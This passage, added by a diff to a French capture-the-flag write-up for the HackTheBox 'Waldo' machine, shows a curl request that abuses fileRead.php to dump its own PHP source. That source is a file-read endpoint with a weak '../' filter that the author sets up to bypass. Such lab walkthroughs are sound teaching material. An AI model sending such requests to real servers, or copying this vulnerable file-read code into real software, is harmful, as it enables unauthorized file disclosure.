@@ -46,4 +46,24 @@ dirRead.php (Fichier pour lire les répértoires) Paramètre : path=<br />
 
 On va plus s'intéréssé au fichier fileRead.php et dirRead.php ils sont beaucoup plus utiles.
 
+    root@seyptoo-Aspire-E5-721:~/htb/writeup/Waldo# curl -s -X POST http://10.10.10.87/fileRead.php -d "file=fileRead.php"|jq -r .file
+    <?php
+
+
+    if($_SERVER['REQUEST_METHOD'] === "POST"){
+            $fileContent['file'] = false;
+            header('Content-Type: application/json');
+            if(isset($_POST['file'])){
+                    header('Content-Type: application/json');
+                    $_POST['file'] = str_replace( array("../", "..\""), "", $_POST['file']);
+                    if(strpos($_POST['file'], "user.txt") === false){
+                            $file = fopen("/var/www/html/" . $_POST['file'], "r");
+                            $fileContent['file'] = fread($file,filesize($_POST['file']));  
+                            fclose();
+                    }
+            }
+            echo json_encode($fileContent);
+    }
+    
+Voilà on a réussis à lire le fichier fileRead.php comme pour on peut le voir il y'a du str_replace.
 
